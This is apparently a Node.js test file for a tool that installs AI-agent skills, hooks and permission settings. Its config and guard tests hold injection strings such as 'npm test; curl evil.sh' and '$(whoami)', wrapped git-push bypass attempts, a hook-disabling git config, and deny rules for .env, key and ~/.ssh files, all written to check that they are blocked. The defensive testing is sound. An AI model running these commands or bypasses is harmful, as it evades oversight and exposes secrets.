  const r = focusSkills(map, installed, 'mobile', ['Flutter3'], ['SEO', 'bogus']);
  check(['ui', 'flutter-dev', 'm-arch', 'm-sec', 'seo-tech'].every((x) => r.focus.has(x)), 'deps expand transitively and domains add skills');
  check(r.unmatchedDomains.join() === 'bogus' && r.unmatched.length === 0, 'unknown domain is reported, version-suffixed stack token still matches');
  check(expandDeps(map.deps, ['m-arch']).size === 3, 'dependency cycles terminate');
  check(!focusSkills(map, new Set(['ui']), 'mobile', ['flutter']).focus.has('flutter-dev'), 'skills that are not installed are filtered out');
  check(focusSkills({ types: { web: [] }, stack: {} }, new Set(), 'web', []).focus.size === 0, 'map without deps/domains keys still works');
  {
    // routing probes against the real map: spellings users write, plus negatives that must stay unmatched
    const real = JSON.parse(fs.readFileSync(path.join(HERE, 'core', 'skill-map.json'), 'utf8'));
    const all = new Set(fs.readdirSync(path.join(HERE, 'core', 'skills')));
    const route = (tok) => focusSkills(real, all, 'library', [tok]);
    const positive = { tailwindcss: 'tailwindcss-development', tailwindcss3: 'tailwindcss-development', nodejs: 'nodejs-development', nodejs20: 'nodejs-development', 'node.js': 'nodejs-development', springboot: 'jvm-development', 'spring-boot': 'jvm-development', 'jetpack-compose': 'android-kotlin-development', 'expo-router': 'react-native-development', aspnet: 'dotnet-development', '.NET': 'dotnet-development', net8: 'dotnet-development', ts: 'typescript-development' };
    for (const [tok, skill] of Object.entries(positive)) check(route(tok).focus.has(skill) && route(tok).unmatched.length === 0, `stack token "${tok}" routes ${skill}`);
    for (const tok of ['gorm', 'kotlinx', 'next', 'network', 'seo', 'payments', 'cobol']) check(route(tok).unmatched.length === 1, `stack token "${tok}" stays unmatched`);
    check(!route('kotlin').focus.has('android-kotlin-development') && route('kotlin').focus.has('jvm-development'), 'ambiguous "kotlin" routes the JVM skill only; Android needs an android/compose token');
    check(focusSkills(real, all, 'library', [], ['payment']).unmatchedDomains.join() === 'payment' && focusSkills(real, all, 'library', [], ['SEO']).unmatchedDomains.length === 0, 'domain matching is case-insensitive but exact (singular "payment" is unmatched)');
  }
  check(shipsWithSkill('x/SKILL.md') && shipsWithSkill('x/references/a.md') && !shipsWithSkill('x/evals/a.json') && !shipsWithSkill('x\\examples\\a.md'), 'evals/ and examples/ inside a skill are not installed');
  check(claimViolations('We guarantee first page rankings').length === 1 && claimViolations('Never promise or guarantee rankings').length === 0, 'SEO overclaim detector flags promises, allows negations');
}

}

if (on('skill lint')) {
console.log('\n[skill lint]');
{
  const root = path.join(HERE, 'core', 'skills');
  const problems = [];
  for (const s of fs.readdirSync(root)) {
    const dir = path.join(root, s);
    const text = fs.readFileSync(path.join(dir, 'SKILL.md'), 'utf8');
    if (text.split(/\r?\n/).length > 150) problems.push(`${s}: SKILL.md over 150 lines (move depth into references/)`);
    for (const m of text.matchAll(/\]\(((?!https?:|#|mailto:)[^)\s]+)\)/g)) if (!fs.existsSync(path.join(dir, m[1].split('#')[0]))) problems.push(`${s}: broken link ${m[1]}`);
    for (const f of walk(dir).filter((x) => /[\\/](references|rules|checklists)[\\/]/.test(x) && x.endsWith('.md'))) {
      const b = path.basename(f);
      if (b !== 'SOURCES.md' && !text.includes(b)) problems.push(`${s}: ${path.relative(dir, f)} is not mentioned in SKILL.md`);
    }
    const src = path.join(dir, 'references', 'SOURCES.md');
    if (fs.existsSync(src) && !/\|\s*Source\s*\|\s*Publisher\s*\|\s*URL\s*\|\s*Version\s*\|\s*Verified\s*\|/i.test(fs.readFileSync(src, 'utf8'))) problems.push(`${s}: references/SOURCES.md lacks the Source|Publisher|URL|Version|Verified table header`);
    if (/^seo-/.test(s)) { const { claimViolations } = await import(pathToFileURL(path.join(HERE, 'lib', 'routing.mjs')).href); for (const f of walk(dir).filter((x) => x.endsWith('.md'))) for (const l of claimViolations(fs.readFileSync(f, 'utf8'))) problems.push(`${s}: overclaim in ${path.basename(f)}: ${l.trim()}`); }
  }
  check(problems.length === 0, `core skills: size cap, links resolve, references are indexed, SOURCES.md format${problems.length ? '\n    ' + problems.join('\n    ') : ''}`);
  const map = JSON.parse(fs.readFileSync(path.join(HERE, 'core', 'skill-map.json'), 'utf8'));
  const known = new Set([...fs.readdirSync(root), ...fs.readdirSync(path.join(HERE, 'templates', '.claude', 'skills'))]);
  const refs = [...Object.entries(map.deps || {}).flat(2), ...Object.values(map.domains || {}).flat()];
  check(refs.every((x) => known.has(x)), 'skill-map deps/domains reference only existing skills');
  fs.mkdirSync(path.join(base, 'domains-warn'), { recursive: true });
  fs.writeFileSync(path.join(base, 'domains-warn', 'project.config.yml'), 'name: D\ntype: web\nstack: [react]\ndomains: [nonexistent]\nbranches: {working: a, production: main}\n');
  const w = spawnSync(process.execPath, [INIT, '--target', path.join(base, 'domains-warn'), '--dry-run'], { encoding: 'utf8' });
  check(w.status === 0 && /domain\(s\) matched no skill: nonexistent/.test(w.stderr), 'unknown domains warn but do not fail');
}

}

if (on('mobile routing')) {
console.log('\n[mobile routing]');
{
  const mk = (name, body) => { const d = path.join(base, 'mob-' + name); fs.mkdirSync(d, { recursive: true }); fs.writeFileSync(path.join(d, 'project.config.yml'), `name: M\n${body}\nbranches: {working: a, integration: "", production: main}\n`); return d; };
  const shared = ['mobile-architecture', 'mobile-security', 'mobile-release'];
  const fixtures = { flutter: ['type: mobile\nstack: [flutter]', 'flutter-development'], expo: ['type: mobile\nstack: [expo, typescript]', 'react-native-development'], android: ['type: mobile\nstack: [android]', 'android-kotlin-development'], ios: ['type: mobile\nstack: [swiftui]', 'swift-development'] };
  for (const [k, [body, main]] of Object.entries(fixtures)) {
    const d = mk(k, body); const r = run(d);
    const have = new Set(fs.readdirSync(path.join(d, '.claude/skills')));
    check(r.status === 0 && have.has(main) && shared.every((s) => have.has(s)), `${k}: installs ${main} plus the shared mobile skills`);
    check(fs.existsSync(path.join(d, '.claude/skills', main, 'references')) && !fs.existsSync(path.join(d, '.claude/skills', main, 'evals')), `${k}: references are installed, evals are not`);
    check(/0 created, 0 updated/.test(run(d).stdout), `${k}: re-run is idempotent`);
  }
  const web = mk('web', 'type: web\nstack: [laravel]'); run(web);
  check(!fs.readdirSync(path.join(web, '.claude/skills')).some((s) => s.startsWith('mobile-') || s === 'android-kotlin-development'), 'web/laravel project gets no mobile skills');
  const bare = mk('bare', 'type: mobile\nstack: [cobol]'); run(bare);
  const hb = new Set(fs.readdirSync(path.join(bare, '.claude/skills')));
  check(hb.has('mobile-architecture') && hb.has('mobile-security') && !hb.has('mobile-release'), 'mobile type with unmapped stack still gets architecture + security guidance');
  // D7: type alone does not install mobile-release/mobile-quality; init says so instead of adding the skills
  const warnFor = (name, body) => run(mk(name, body)).stderr;
  check(/no platform stack token matched[\s\S]*mobile-release and mobile-quality are not installed/.test(warnFor('w-bare2', 'type: mobile\nstack: [capacitor]')), 'mobile type with no platform token warns that mobile-release and mobile-quality are not installed');
  check(/no platform stack token matched/.test(warnFor('w-kotlin', 'type: mobile\nstack: [kotlin]')), 'kotlin without an android token gets the same warning');
  check(!/no platform stack token/.test(warnFor('w-expo', 'type: mobile\nstack: [expo, typescript]')) && !/no platform stack token/.test(warnFor('w-android', 'type: mobile\nstack: [android]')), 'a platform token silences the warning');
  check(!/no platform stack token/.test(warnFor('w-web', 'type: web\nstack: [laravel]')) && !/no platform stack token/.test(warnFor('w-all', 'type: mobile\nstack: [capacitor]\nskills_mode: all')), 'no warning for non-mobile types or when every skill is installed');
}

}

if (on('seo wordpress routing')) {
console.log('\n[seo wordpress routing]');
{
  const mk = (name, body) => { const d = path.join(base, 'p3-' + name); fs.mkdirSync(d, { recursive: true }); fs.writeFileSync(path.join(d, 'project.config.yml'), `name: P\n${body}\nbranches: {working: a, integration: "", production: main}\n`); return d; };
  const skills = (d) => new Set(fs.readdirSync(path.join(d, '.claude/skills')));
  const wp = mk('wp', 'type: web\nstack: [wordpress, mysql]\ndomains: [seo]'); const r = run(wp); const h = skills(wp);
  check(r.status === 0 && !/matched no skill/.test(r.stderr), 'wordpress + seo domain generates without routing warnings');
  check(['wordpress-development', 'php-development', 'seo-technical', 'seo-on-page-content', 'seo-structured-data', 'seo-web-vitals', 'seo-international-ecommerce', 'seo-migration-monitoring'].every((s) => h.has(s)), 'wordpress stack + seo domain install the WordPress, PHP and SEO skills');
  check(/0 created, 0 updated/.test(run(wp).stdout), 'wordpress + seo re-run is idempotent');
  const plain = mk('plain', 'type: web\nstack: [react]'); run(plain);
  check(![...skills(plain)].some((s) => s.startsWith('seo-') || s === 'wordpress-development' || s === 'php-development'), 'a web project without the seo domain gets no SEO/WordPress/PHP skills');
  const mob = mk('mob', 'type: mobile\nstack: [flutter]'); run(mob);
  check(skills(mob).has('mobile-quality'), 'mobile framework skills pull in mobile-quality');
  check(fs.existsSync(path.join(wp, '.claude/skills/seo-technical/references/frameworks/wordpress.md')), 'nested framework references are installed');
}

}

if (on('live and scenario evals')) {
console.log('\n[live and scenario evals]');
{
  const lib = await import(pathToFileURL(path.join(HERE, 'evals', 'lib.mjs')).href);
  const all = lib.loadCases('all'); const legacy = lib.loadCases('legacy'); const trig = lib.loadCases('triggers');
  check(legacy.length === 70 && trig.length > 0 && all.length === legacy.length + trig.length, 'case loader reads cases.json and evals/triggers/*.json');
  const multi = { expect: ['a'], expect_all: ['b'], not: ['x'], live_expect_all: ['c'], live_not: ['y'] };
  check(lib.scoreCase(multi, ['a', 'b'], false).ok && !lib.scoreCase(multi, ['a', 'b'], true).ok && lib.scoreCase(multi, ['a', 'b', 'c'], true).ok, 'scoring: live_* expectations apply only in live mode');
  check(lib.scoreCase(multi, ['a', 'b', 'x'], false).forbidden.join() === 'x' && !lib.scoreCase(multi, ['b'], false).ok, 'scoring: forbidden and missing skills fail the case');
  const sum = lib.summarize([{ case: { expect: ['a'] }, got: ['a'], forbidden: [] }, { case: { expect: ['a'] }, got: [], forbidden: [], ok: false }, { case: { not: ['x'] }, got: ['x'], forbidden: ['x'], ok: false }]);
  check(sum.per.a.tp === 1 && sum.per.a.fn === 1 && sum.per.x.fp === 1 && sum.per.a.recall === 0.5, 'summary counts per-skill tp/fn/fp and recall');
  const dry = spawnSync(process.execPath, [path.join(HERE, 'evals/live.mjs'), '--dry-run', '--suite', 'all', '--repeats', '2', '--type', 'mobile', '--stack', 'flutter'], { encoding: 'utf8', env: { ...process.env, ANTHROPIC_API_KEY: '' } });
  check(dry.status === 0 && new RegExp(`API calls: ${all.length * 2}\\b`).test(dry.stdout), 'live eval dry-run counts suite x repeats and sends nothing');
  const capped = spawnSync(process.execPath, [path.join(HERE, 'evals/live.mjs'), '--suite', 'all', '--repeats', '3'], { encoding: 'utf8', env: { ...process.env, ANTHROPIC_API_KEY: 'x' } });
  check(capped.status === 2 && /exceed --max-calls/.test(capped.stderr), 'live eval refuses a run above --max-calls before any API call');

  const sl = await import(pathToFileURL(path.join(HERE, 'evals', 'scenario-lib.mjs')).href);
  const ids = sl.listScenarios();
  check(ids.length >= 5, `${ids.length} task scenarios present`);
  const chk = spawnSync(process.execPath, [path.join(HERE, 'evals/scenarios.mjs'), '--check'], { encoding: 'utf8' });
  check(chk.status === 0, `every scenario's graders fail on the bare fixture and pass on the reference solution${chk.status ? '\n' + chk.stdout : ''}`);
  const bad = sl.loadScenario('structured-data-product');
  const tmp = fs.mkdtempSync(path.join(base, 'scen-'));
  sl.copyDir(path.join(bad.root, 'fixture'), tmp); sl.copyDir(path.join(bad.root, 'solution'), tmp);
  const rp = path.join(tmp, 'render.mjs');
  fs.writeFileSync(rp, fs.readFileSync(rp, 'utf8').replace("name: product.name,", "name: product.name, aggregateRating: { '@type': 'AggregateRating', ratingValue: '4.8', reviewCount: '12' },"));
  const g = sl.grade(tmp, bad);
  check(g.find((x) => x.id === 'no-fabricated-reviews').pass === false && g.find((x) => x.id === 'jsonld-valid-and-matches-data').pass, 'graders catch fabricated ratings that a plausible answer might add');
  const hostile = fs.mkdtempSync(path.join(base, 'scen-'));
  sl.copyDir(path.join(bad.root, 'fixture'), hostile); sl.copyDir(path.join(bad.root, 'solution'), hostile);
  const hp = path.join(hostile, 'render.mjs');
  fs.writeFileSync(hp, fs.readFileSync(hp, 'utf8').replace(/\.replace\(\/<\/g,[^)]*\)\.replace\(\/>\/g,[^)]*\)/, ''));
  check(sl.grade(hostile, bad).find((x) => x.id === 'script-breakout-escaped').pass === false, 'graders catch JSON-LD that can be closed with </script>');
  check(sl.changedFiles(tmp, path.join(bad.root, 'fixture')).includes('render.mjs') && !sl.changedFiles(tmp, path.join(bad.root, 'fixture')).includes('product.json'), 'changedFiles reports only edited files');

  const { buildReport } = await import(pathToFileURL(path.join(HERE, 'evals', 'report.mjs')).href);
  check(/unevaluated/.test(buildReport([])), 'report says "unevaluated" when no live results exist');
  const rep = buildReport([{ kind: 'trigger', date: '2026-01-01', model: 'm', suite: 'all', repeats: 1, skillsListed: 5, tokens: { fresh: 1, cacheWrite: 2, cacheRead: 3, out: 4 }, summary: { calls: 10, passed: 9, passRate: 0.9, per: { a: { tp: 9, fn: 1, fp: 0, recall: 0.9, precision: 1 } } }, failures: [] }, { kind: 'scenarios', date: '2026-01-01', model: 'm', runsPerCell: 1, budgetPerRunUsd: 1, runs: [{ scenario: 's', arm: 'skills', run: 1, pass: true, cost: 0.5, turns: 3, graders: [{ category: 'security', pass: true }] }] }]);
  check(/9 \(90%\)/.test(rep) && /\| s \| skills \| 1 \| 1\/1/.test(rep) && /security \| skills \| 1\/1/.test(rep), 'report renders trigger and scenario results with counts');
}

}

if (on('fullstack product domains')) {
console.log('\n[fullstack product domains]');
{
  const mk = (name, body) => { const d = path.join(base, 'p6-' + name); fs.mkdirSync(d, { recursive: true }); fs.writeFileSync(path.join(d, 'project.config.yml'), `name: P\n${body}\nbranches: {working: a, integration: "", production: main}\n`); return d; };
  const skills = (d) => new Set(fs.readdirSync(path.join(d, '.claude/skills')));
  const map = JSON.parse(fs.readFileSync(path.join(HERE, 'core', 'skill-map.json'), 'utf8'));
  const dom = ['saas', 'payments', 'realtime', 'events', 'search', 'product'];
  check(dom.every((d) => (map.domains[d] || []).length > 0), 'domains saas, payments, realtime, events, search and product are mapped');
  for (const d of dom) {
    const dir = mk(d, `type: api\nstack: [node]\ndomains: [${d}]`); const r = run(dir); const have = skills(dir);
    const want = [...map.domains[d], ...map.domains[d].flatMap((s) => map.deps[s] || [])];
    check(r.status === 0 && !/matched no skill/.test(r.stderr) && want.every((s) => have.has(s)), `domain "${d}" installs ${map.domains[d].join(', ')} and their dependencies`);
  }
  const plain = mk('plain', 'type: api\nstack: [node]'); run(plain);
  const all = new Set(dom.flatMap((d) => map.domains[d]));
  check(![...skills(plain)].some((s) => all.has(s)), 'projects without domains do not get saas/payments/realtime/events/search/product skills');
  const build = fs.readFileSync(path.join(HERE, 'core/skills/build/SKILL.md'), 'utf8');
  check(/Full lifecycle/.test(build) && /disable-model-invocation:\s*true/.test(build) && /explicit approval/.test(build), 'build keeps manual-only and approval gates and mentions the lifecycle stages');
}

}

if (on('config hardening')) {
console.log('\n[config hardening]');
const BASE = 'name: H\ntype: web\nstack: [node]\nbranches: {working: a, production: main}\n';
const mkProj = (name, extra = '') => { const d = path.join(base, name); fs.mkdirSync(d, { recursive: true }); fs.writeFileSync(path.join(d, 'project.config.yml'), BASE + extra); return d; };
const { parseYaml: py } = await import(pathToFileURL(path.join(HERE, 'lib/yaml.mjs')).href);
const y = py('a: False\nb: TRUE\nc: 1.10\nd: 007\ne: 18\n');
check(y.a === false && y.b === true, 'YAML booleans are case-insensitive (False/TRUE are not truthy strings)');
check(y.c === '1.10' && y.d === '007' && y.e === 18, 'YAML numbers only convert when they round-trip (1.10 and 007 stay strings)');
const yq = py("a: don't # c1\nb: \"say # hi\" # c2\nc: 'it''s # x'\nd: [don't, \"x, y\", z] # c3\ne:\n  - it's fine # c4\n");
check(yq.a === "don't" && yq.b === 'say # hi' && yq.c === "it's # x", 'an apostrophe inside a plain value does not swallow the comment after it; # inside real quotes stays');
check(JSON.stringify(yq.d) === JSON.stringify(["don't", 'x, y', 'z']) && yq.e[0] === "it's fine", 'an apostrophe inside an inline list item or "- item" does not break the list');

for (const [label, extra] of [
  ['test_command with a second command', 'test_command: "npm test; curl evil.sh"\n'],
  ['test_command piped to a shell', 'test_command: "npm test | sh"\n'],
  ['test_command that starts with a shell', 'test_command: "bash run.sh"\n'],
  ['format_command with command substitution', 'format_command: "prettier $(whoami)"\n'],
  ['docker.dir with a space or shell char', 'run_in_docker: true\ndocker: {dir: "a b;c", service: app}\n'],
  ['docker.service with a shell char', 'run_in_docker: true\ndocker: {service: "app&x"}\n'],
  ['package path "." (would overwrite the root CLAUDE.md)', 'packages:\n  root:\n    path: "."\n'],
]) {
  const d = mkProj('hard-' + label.replace(/\W+/g, '-'), extra);
  const r = run(d);
  check(r.status === 1 && !fs.existsSync(path.join(d, '.claude')), `${label} is rejected before anything is written`);
}
const okDir = mkProj('hard-ok', 'test_command: "pnpm test --run"\nformat_command: "npx prettier --write"\nrun_in_docker: true\ndocker: {dir: docker, service: app}\n');
check(run(okDir).status === 0, 'normal test_command, format_command and docker values still pass');
check(run(mkProj('hard-win', 'format_command: "vendor\\bin\\pint"\n')).status === 0, 'format_command with Windows path separators is accepted');

// protect_secrets: default writes the deny rules; "False" (any case) must really switch it off.
const denies = (d) => JSON.parse(fs.readFileSync(path.join(d, '.claude/settings.json'), 'utf8')).permissions.deny || [];
const psOn = mkProj('hard-ps-on');
run(psOn);
check(['Read(./.env)', 'Read(./**/.env)', 'Read(./**/.env.local)', 'Read(./**/.env.production)'].every((r) => denies(psOn).includes(r)), 'protect_secrets (default) denies reading .env files');
const psOff = mkProj('hard-ps-off', 'protect_secrets: False\n');
run(psOff);
check(!denies(psOff).includes('Read(./.env)'), 'protect_secrets: False (capitalised) is honoured as an opt-out');

// A failed check must still save the hashes of the files init already wrote, so the next run sees no phantom hand edits.
const hp = mkProj('hard-hash', 'forbid: [H]\n');
const hr = run(hp);
check(hr.status === 1 && fs.existsSync(path.join(hp, '.claude/.template-hashes.json')), 'hashes are saved even when a post-write check fails');
fs.writeFileSync(path.join(hp, 'project.config.yml'), BASE);
const hr2 = run(hp);
check(hr2.status === 0 && !/Kept \d+ file/.test(hr2.stdout) && !fs.existsSync(path.join(hp, '.claude/.init-backup')), 'the re-run after fixing the config keeps no file as "hand-edited" and makes no backup');

// --check must not treat the machine-local .vscode/settings.json as generated drift.
const ck = mkProj('hard-check');
run(ck);
fs.rmSync(path.join(ck, '.vscode'), { recursive: true, force: true });
check(run(ck, ['--check']).status === 0, '--check passes when only .vscode/settings.json is missing');
}

if (on('guards hardening')) {
console.log('\n[guards hardening]');
const BASE = 'name: G\ntype: web\nstack: [node]\nbranches: {working: dev1, integration: develop, production: main}\n';
const mk = (name, extra = '') => { const d = path.join(base, name); fs.mkdirSync(d, { recursive: true }); fs.writeFileSync(path.join(d, 'project.config.yml'), BASE + extra); return d; };
const linkOk = (target, p, type) => { try { fs.symlinkSync(target, p, type); return true; } catch { return false; } };

const gp = mk('guards');
spawnSync('git', ['init', '-q'], { cwd: gp });
spawnSync('git', ['symbolic-ref', 'HEAD', 'refs/heads/dev1'], { cwd: gp });
check(run(gp).status === 0, 'init with guards exits 0');
const hook = (name, input) => spawnSync(process.execPath, [path.join(gp, '.claude', 'hooks', `${name}.mjs`)], { input: JSON.stringify({ cwd: gp, ...input }), encoding: 'utf8', env: { ...process.env, CLAUDE_PROJECT_DIR: gp } });
const bash = (command) => hook('guard-bash', { tool_name: 'Bash', tool_input: { command } });
const write = (file_path) => hook('guard-secrets', { tool_name: 'Write', tool_input: { file_path, content: 'x' } });
check(['env git push origin main', 'command git push origin main', 'sudo git push origin main', 'bash -c "git push origin main"', 'sh -c \'git push origin main\'', 'eval "git push origin main"', 'echo $(git push origin main)', 'echo `git push origin main`', 'FOO=1 env -i git push --force'].every((c) => bash(c).status === 2), 'guard-bash: push to a protected branch is still blocked behind env/command/sudo/bash -c/eval/$()/backticks');
check(bash('git push --mirror').status === 2 && bash('git push --all origin').status === 2, 'guard-bash: push --mirror/--all is blocked');
check(bash('env git status').status === 0 && bash('bash -c "git push origin dev1"').status === 0, 'guard-bash: wrapped harmless commands are still allowed');
check(/"permissionDecision":"ask"/.test(bash('git config core.hooksPath /dev/null').stdout) && /"permissionDecision":"ask"/.test(bash('git -c core.hooksPath=/dev/null commit -m x').stdout), 'guard-bash: changing core.hooksPath asks the user');

fs.writeFileSync(path.join(gp, '.env'), 'A=1\n');
check(write('.ENV').status === 2 && write('.Env.Local').status === 2, 'guard-secrets: .env is matched case-insensitively');
check(write('.env.example').status === 0, 'guard-secrets: .env.example stays writable');
if (linkOk('.env', path.join(gp, 'notes.txt'))) check(write('notes.txt').status === 2, 'guard-secrets: a symlink pointing at .env is blocked');

const dn = (d) => JSON.parse(fs.readFileSync(path.join(d, '.claude/settings.json'), 'utf8')).permissions.deny;
check(['Read(./.env.staging)', 'Read(./**/.env.development)', 'Read(./**/*.pem)', 'Read(./**/*.key)', 'Read(~/.ssh/**)'].every((r) => dn(gp).includes(r)), 'protect_secrets denies more .env variants, keys and ~/.ssh');
check(!dn(gp).some((r) => /\.env\.example/.test(r)), 'protect_secrets does not deny .env.example');

const sl = mk('guards-symlink');
const outside = path.join(base, 'guards-outside'); fs.mkdirSync(outside, { recursive: true });
if (linkOk(outside, path.join(sl, '.claude'), 'dir')) {
  const r = run(sl);
  check(r.status === 1 && /symlink/.test(r.stderr) && fs.readdirSync(outside).length === 0, 'init refuses to write through a symlinked .claude and writes nothing outside the project');
}

const ph = mk('guards-braces', 'notes:\n  - "Blade prints {{ $user }}; Vue prints {{ item }}."\n');
const phr = run(ph);
check(phr.status === 0, 'a {{...}} the user wrote in a config value is not reported as an unresolved placeholder');

const sc = path.join(base, 'my app #1'); fs.mkdirSync(sc, { recursive: true });
fs.writeFileSync(path.join(sc, 'package.json'), JSON.stringify({ dependencies: { next: '14', react: '18' } }));
const scr = run(sc, ['--scaffold']);
const { parseYaml } = await import(pathToFileURL(path.join(HERE, 'lib/yaml.mjs')).href);
let scy = {}; try { scy = parseYaml(fs.readFileSync(path.join(sc, 'project.config.yml'), 'utf8')); } catch { /* reported below */ }
check(scr.status === 0 && scy.name === 'my app #1', '--scaffold quotes a folder name that contains a space and #');
check(Array.isArray(scy.stack) && scy.stack.includes('nextjs') && scy.stack.includes('react'), '--scaffold detects next and react together');

const dr = mk('guards-dry');
const drr = run(dr, ['--dry-run']);
check(drr.status === 0 && !fs.existsSync(path.join(dr, '.claude')) && !fs.existsSync(path.join(dr, 'AGENTS.md')), '--dry-run writes nothing');
check(!/artauk|\bARTA\b|working: muhib/i.test(fs.readFileSync(path.join(HERE, 'project.config.example.yml'), 'utf8')), 'the public example config holds no real project data');
const wf = fs.readFileSync(path.join(HERE, '.github/workflows/test.yml'), 'utf8');
check(/^permissions:\s*\n\s+contents: read/m.test(wf), 'test workflow declares least-privilege permissions');
}

if (on('orch-report')) {
console.log('\n[orch-report]');
{
  // The report text is what a user reads after an orchestrated run, so it must never claim more than the ledger records.
  const { efficiencyReport, completionReport } = await import(pathToFileURL(path.join(HERE, 'lib', 'orch-report.mjs')).href);
  const { newBudget, record, noteRepair } = await import(pathToFileURL(path.join(HERE, 'lib', 'orch-budget.mjs')).href);
  const led = (over = {}) => ({ id: 'T-1', state: 'completed', goal: 'fix the bug', profile: 'small', branch: 'feat/x', budget: newBudget('small'), steps: [], ...over });

  // --- efficiencyReport: cost and counts
  let b2 = record(record(newBudget('small'), { cost: 0.1 }), { cost: 0.0234 });
  const eff = efficiencyReport(led({ budget: b2, steps: [{ model: 'sonnet' }, { model: 'sonnet' }, { model: 'haiku' }, {}] }));
  check(/^Efficiency report/.test(eff) && /Cost: \$0\.123 actual$/m.test(eff) && !/lower bound/.test(eff), 'efficiency: a fully known cost is shown as an actual amount');
  check(/Model calls: 2 of 3/.test(eff) && /Agent dispatches: 2/.test(eff) && /Budget used: \$0\.123 of \$0\.75 \(calls 2\/3\)/.test(eff), 'efficiency: calls and budget are taken from the budget record');
  check(/Models used: sonnet, haiku$/m.test(eff), 'efficiency: models are listed once each, steps without a model are ignored');
  check(/Models used: none$/m.test(efficiencyReport(led())), 'efficiency: no recorded model is reported as "none"');
  check(/Tool calls: not reported by the CLI/.test(eff) && /context the CLI loads by itself is not measured/.test(eff), 'efficiency: unmeasured figures are stated as not measured, never invented');

  const allUnknown = efficiencyReport(led({ budget: record(newBudget('small'), { cost: null }) }));
  check(/Cost: unavailable \(the CLI reported no cost\)/.test(allUnknown) && !/actual/.test(allUnknown), 'efficiency: when no call reported a cost, the cost is "unavailable", not $0.000');
  const someUnknown = efficiencyReport(led({ budget: record(record(newBudget('small'), { cost: 0.2 }), { cost: undefined }) }));
  check(/\$0\.200 actual \(1 call\(s\) reported no cost, so this is a lower bound\)/.test(someUnknown), 'efficiency: a partly unknown cost is marked as a lower bound');
  check(/Cost: \$0\.000 actual/.test(efficiencyReport(led())), 'efficiency: zero calls is a known zero cost, not "unavailable"');

  // --- efficiencyReport: avoided work
  const tiny = efficiencyReport(led({ budget: newBudget('tiny') }));
  check(/planner \(tiny profile\)/.test(tiny) && /repair call/.test(tiny), 'efficiency: tiny profile and no repairs list the planner and the repair call as avoided');
  const repaired = efficiencyReport(led({ budget: noteRepair(newBudget('small')) }));
  check(!/repair call/.test(repaired) && /Repair iterations: 1 of 1/.test(repaired) && !/planner \(tiny profile\)/.test(repaired), 'efficiency: a used repair is not listed as avoided, and a planned profile does not avoid the planner');
  check(/outside this slice/.test(eff), 'efficiency: out-of-scope work is always flagged as outside this slice');

  // --- completionReport
  const plan = { summary: 'Guard the null case', acceptance_criteria: ['null input returns 0', 'tests pass'] };
  const done = completionReport(led({ plan, changedFiles: [{ path: 'src/a.js' }, { path: 'src/b.js' }], validation: { ran: true, command: 'npm test', exitCode: 0, attempts: 1 } }));
  check(/^Task T-1: completed$/m.test(done) && /^Goal: fix the bug$/m.test(done) && /^Profile: small, branch feat\/x$/m.test(done), 'completion: header shows id, state, goal, profile and branch');
  check(/^Plan: Guard the null case$/m.test(done) && /^  - null input returns 0$/m.test(done) && /^  - tests pass$/m.test(done), 'completion: plan summary and each acceptance criterion are listed');
  check(/Changed files \(2\): src\/a\.js, src\/b\.js/.test(done) && /Validation: `npm test` exited 0\./.test(done) && !/after \d+ attempts/.test(done), 'completion: changed files and a first-attempt validation are reported plainly');
  check(done.includes('\n\nEfficiency report\n'), 'completion: the efficiency report follows after a blank line');
  check(/exited 0 after 2 attempts\./.test(completionReport(led({ plan, validation: { ran: true, command: 'npm test', exitCode: 0, attempts: 2 } }))), 'completion: more than one validation attempt is stated');
  check(/^Changed files: none recorded$/m.test(completionReport(led({ plan }))) && /^Changed files: none recorded$/m.test(completionReport(led({ plan, changedFiles: [] }))), 'completion: no recorded change is stated, not assumed');
  check(!/^Plan:/m.test(completionReport(led({ plan: null }))) && !/Acceptance criteria/.test(completionReport(led({ plan: null }))), 'completion: a ledger without a plan prints no plan section');

  // --- completionReport: never claims what was not verified
  const notRun = completionReport(led({ state: 'failed', plan, validation: { ran: false, note: 'no test command' } }));
  check(/Validation: NOT RUN \(no test command\)\. Nothing is verified; review the diff yourself\./.test(notRun) && !/exited/.test(notRun), 'completion: validation that did not run says NOT RUN with the note and claims no exit code');
  check(/Validation: NOT RUN\. Nothing is verified/.test(completionReport(led({ state: 'failed', plan, validation: null }))), 'completion: a missing validation record is also NOT RUN');
  const failed = completionReport(led({ state: 'failed', stateReason: 'tests failed', plan, validation: { ran: true, command: 'npm test', exitCode: 1, attempts: 2 } }));
  check(/^Task T-1: failed \(tests failed\)$/m.test(failed) && /exited 1 after 2 attempts/.test(failed) && /Risk: the change is on branch feat\/x and is not verified\./.test(failed), 'completion: a failed task shows its reason, the failing exit code and the unverified-branch risk');
  check(/Risk: the change is on branch/.test(completionReport(led({ state: 'blocked', plan, validation: null }))), 'completion: a blocked task also carries the risk line');
  check(!/Risk:/.test(done), 'completion: a completed, validated task carries no risk line');

  const exhausted = completionReport(led({ state: 'budget_exhausted', stateReason: 'cost_cap', plan, remaining: ['write tests', 'update docs'], validation: { ran: false } }));
  check(/Stopped: cost_cap\. Remaining work: write tests, update docs\. Continue only by raising the cap explicitly: --resume T-1 --max-cost <larger USD>\./.test(exhausted), 'completion: budget exhaustion lists the remaining work and the explicit resume command');
  check(/Remaining work: see ledger\./.test(completionReport(led({ state: 'budget_exhausted', stateReason: 'call_cap', plan, validation: { ran: false } }))), 'completion: budget exhaustion without a remaining list points to the ledger');
}
}

if (on('stale cleanup')) {
console.log('\n[stale cleanup]');
{
  const BASE = 'name: S\ntype: web\nstack: [node]\nbranches: {working: dev1, integration: develop, production: main}\n';
  const mk = (name, extra = '') => { const d = path.join(base, name); fs.mkdirSync(d, { recursive: true }); fs.writeFileSync(path.join(d, 'project.config.yml'), BASE + extra); return d; };
  const setCfg = (d, extra = '') => fs.writeFileSync(path.join(d, 'project.config.yml'), BASE + extra);
  const ls = (d, sub) => (fs.existsSync(path.join(d, '.claude', sub)) ? fs.readdirSync(path.join(d, '.claude', sub)).sort() : []);
  const settings = (d) => JSON.parse(fs.readFileSync(path.join(d, '.claude/settings.json'), 'utf8'));
  const editSettings = (d, f) => { const st = settings(d); f(st); fs.writeFileSync(path.join(d, '.claude/settings.json'), JSON.stringify(st, null, 2) + '\n'); };

  // --- stale skills: skills_mode all -> focused
  const fresh = mk('stale-fresh'); run(fresh);
  const focusedSet = ls(fresh, 'skills');
  const sd = mk('stale-skills', 'skills_mode: all\n'); run(sd);
  const allSet = ls(sd, 'skills');
  const gone = allSet.filter((n) => !focusedSet.includes(n));
  check(gone.length > 0, 'setup: skills_mode all installs skills that focused does not');
